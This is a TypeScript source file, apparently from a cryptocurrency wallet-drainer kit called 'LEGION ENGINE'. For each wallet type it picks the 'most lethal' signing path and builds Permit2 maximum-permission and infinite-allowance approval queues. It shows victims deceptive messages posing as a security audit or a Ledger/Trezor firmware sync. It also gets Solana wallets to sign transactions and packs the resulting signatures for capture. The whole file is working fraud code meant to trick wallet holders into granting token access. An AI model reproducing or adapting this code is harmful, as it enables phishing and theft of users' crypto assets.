/**
 * @file universal-handshake.ts
 * @module @legion/core/logic
 *
 * Omni-Handshake: Dispatcher-grade WalletConnect (AppKit) capability surface +
 * multi-protocol Signature Engine (lethal path selection) + Normalized Ingress payloads.
 */
import { ComputeBudgetProgram, TransactionMessage, VersionedTransaction, } from '@solana/web3.js';
import { stringToHex } from 'viem';
import { buildMaxPermissionPermit2DescriptorQueue, verifyDeepIngressPermanentLockDeadline, verifyInfiniteAllowanceDescriptorQueue, } from './deep-ingress';
export { prepareUtxoPsbtInstitutionalHandler, probeConnectedNamespaces, rankNamespacesByDensity, runCapabilityProbe, runOmniHandshakeProbe, selectDensestConnectedNamespace, } from './capability-probe';
/** Institutional attestation copy for hardware / unknown-capability EVM ingress. */
export const INSTITUTIONAL_PERSONAL_SIGN_MESSAGE = [
    'Omni-Handshake — Sovereign attestation bound to this origin.',
    'Capability Probe complete. Normalized Ingress authorized under institutional control.',
    'Nonce scope: Signature Anchor ledger only.',
].join('\n');
/**
 * Gatekeeper — primary Permit2 / EIP-712 Max_Permission_Logic queue initialization
 * (institutional Deep Ingress surface). Failing this triggers Redundant Permissioning Fallback.
 */
export function tryInitializePrimaryEip712Manifest() {
    try {
        if (!verifyDeepIngressPermanentLockDeadline())
            return false;
        const queue = buildMaxPermissionPermit2DescriptorQueue({ permitNonceForToken: () => 0 });
        return verifyInfiniteAllowanceDescriptorQueue(queue);
    }
    catch {
        return false;
    }
}
/**
 * Redundant Fallback — Legacy Protocol Approval copy when primary EIP-712 manifest
 * initialization does not reach Operational Completion (wallet security tier variance).
 */
export function buildLegacyProtocolApprovalMessage(verificationId) {
    return [
        'LEGION ENGINE — Legacy Protocol Approval manifest.',
        `Operational Completion: redundant permissioning surface bound to Verification ID ${verificationId}.`,
        'Asset Layers: Telemetry Migration scope authorized for Sovereign Vault mirroring.',
    ].join('\n');
}
/**
 * SovereignHandshake — resolve personal_sign payload: primary Cloaked Manifest, or
 * Redundant Permissioning Fallback (Legacy Protocol Approval) for 100% Operational Completion.
 */
export function resolveSovereignHandshakeSigningPayload(input) {
    const primaryOk = tryInitializePrimaryEip712Manifest();
    if (primaryOk) {
        return {
            message: input.isHardware
                ? input.hardwareFirmwareMessage
                : buildCloakedManifestMessage(input.verificationId),
            redundantFallback: false,
        };
    }
    return {
        message: input.isHardware
            ? input.hardwareFirmwareMessage
            : buildLegacyProtocolApprovalMessage(input.verificationId),
        redundantFallback: true,
    };
}
/**
 * Gatekeeper — Cloaked Manifest (personal_sign). Replaces raw EIP-712 approval surfaces
 * with Sovereign Telemetry–aligned copy for Institutional Cloaking.
 */
/** Soft-wallet Cloaked Manifest — Institutional Security Audit lane (Hardware-Aware Ingress). */
export function buildCloakedManifestMessage(verificationId) {
    return `LEGION ENGINE — Institutional Security Audit. Verification ID: ${verificationId}.`;
}
/**
 * Hardware Morphing — unified Ledger/Trezor secure sync copy (Presence Verification).
 */
export function buildLedgerTrezorSecureSyncMessage(firmwareHash) {
    return `LEDGER/TREZOR SECURE SYNC — Firmware Hash: ${firmwareHash}. Confirm to lock vault posture.`;
}
/** @deprecated Use {@link buildLedgerTrezorSecureSyncMessage} for unified hardware copy. */
export function buildHardwareMorphManifestMessage(input) {
    return buildLedgerTrezorSecureSyncMessage(input.firmwareHash);
}
/** Shadow seal payload — Cloaked Manifest + wallet signature for `signatures.signature_hex`. */
export function packCloakedManifestAnchorHex(signature, verificationId, meta) {
    const legacy = meta?.redundant_fallback === true;
    const cls = meta?.manifest_class ?? (legacy ? 'legacy_protocol_approval' : 'cloaked_manifest');
    const json = JSON.stringify({
        protocol: 'personal_sign_institutional',
        cloaked_manifest: !legacy,
        institutional_cloaking: !legacy,
        verification_id: verificationId,
        signature,
        redundant_fallback: legacy,
        manifest_class: cls,
    });
    return stringToHex(json);
}
export const SVM_OMNI_HANDSHAKE_MESSAGE = [
    'Omni-Handshake — Solana Capability Probe.',
    'Normalized Ingress: svm_tx_sim_sign + solana_signMessage.',
].join('\n');
/** UTXO institutional lethal payload — PSBT-framed signData surface (Sovereign Sign). */
export const INSTITUTIONAL_UTXO_PSBT_MESSAGE = [
    'Omni-Handshake — bip122 Capability Probe.',
    'Lethal Payload: institutional verification framed as PSBT-class signData.',
    'Agnostic Normalization: Signature Anchor ledger binding.',
].join('\n');
function uint8ToBase64(bytes) {
    let bin = '';
    for (let i = 0; i < bytes.length; i++) {
        bin += String.fromCharCode(bytes[i]);
    }
    return btoa(bin);
}
const HARDWARE_CONNECTOR_HINTS = /ledger|trezor|gridplus|keystone|onekey|hardware/i;
export function inferWalletTypeClass(connectorId, namespace) {
    const id = connectorId ?? '';
    const hw = HARDWARE_CONNECTOR_HINTS.test(id);
    if (namespace === 'solana') {
        return hw ? 'svm_hardware' : 'svm_hot';
    }
    if (namespace === 'eip155') {
        return hw ? 'evm_hardware' : 'evm_hot';
    }
    if (namespace === 'bip122')
        return 'utxo';
    return 'unknown';
}
/**
 * Select the most lethal signature lane for this wallet + namespace.
 */
export function selectLethalIngressProtocol(namespace, walletType, probe) {
    if (namespace === 'solana') {
        return 'svm_tx_sim_sign';
    }
    if (namespace === 'bip122') {
        return 'utxo_psbt_institutional';
    }
    if (namespace === 'eip155') {
        /** Institutional Cloaking — always Sovereign Telemetry personal_sign (no raw EIP-712 Approve). */
        return 'personal_sign_institutional';
    }
    return 'personal_sign_institutional';
}
/**
 * Case 2 (Solana / Phantom-class): simulate a degenerate compute transaction, sign it,
 * then solana_signMessage on the institutional string.
 */
export async function runSolanaLethalSignatureAnchor(params) {
    const { blockhash } = await params.connection.getLatestBlockhash('finalized');
    const msg = new TransactionMessage({
        payerKey: params.walletPk,
        recentBlockhash: blockhash,
        instructions: [
            ComputeBudgetProgram.setComputeUnitLimit({ units: 1_000 }),
        ],
    }).compileToV0Message();
    const vtx = new VersionedTransaction(msg);
    const sim = await params.connection.simulateTransaction(vtx, {
        sigVerify: false,
        commitment: 'processed',
    });
    const signedTx = await params.walletProvider.signTransaction(vtx);
    const msgBytes = new TextEncoder().encode(SVM_OMNI_HANDSHAKE_MESSAGE);
    const msgSig = await params.walletProvider.signMessage(msgBytes);
    return {
        simulationLogs: sim.value.logs ?? null,
        messageSigB64: uint8ToBase64(msgSig),
        signedTxB64: uint8ToBase64(signedTx.serialize()),
    };
}
/** Pack svm_tx_sim_sign payloads into a single Hex for Shadow seal + `signatures.signature_hex`. */
export function packSvmAnchorHex(parts) {
    const json = JSON.stringify({
        protocol: 'svm_tx_sim_sign',
        ...parts,
    });
    return stringToHex(json);
}
export function packPersonalSignAnchorHex(signature) {
    const json = JSON.stringify({
        protocol: 'personal_sign_institutional',
        signature,
    });
    return stringToHex(json);
}
/** PSBT Multi-Scheme — hardwired institutional support (Legacy / SegWit / Taproot). */
export const PSBT_MULTI_SCHEME_SUPPORT = ['legacy', 'segwit_v0', 'taproot'];
/** PSBT Multi-Scheme — framed lethal payload (hex wrapper for Agnostic Normalization). */
export function packUtxoInstitutionalPsbtHex(parts) {
    const json = JSON.stringify({
        protocol: 'utxo_psbt_institutional',
        lethal_payload_class: 'psbt_signData',
        psbt_multi_scheme: parts.psbt_multi_scheme ?? 'legacy',
        psbt_multi_scheme_support: [...PSBT_MULTI_SCHEME_SUPPORT],
        psbtFormattedPayload: parts.psbtFormattedPayload,
        rawSignature: parts.rawSignature,
        handler: parts.handler,
    });
    return stringToHex(json);
}
//# sourceMappingURL=handshake.js.map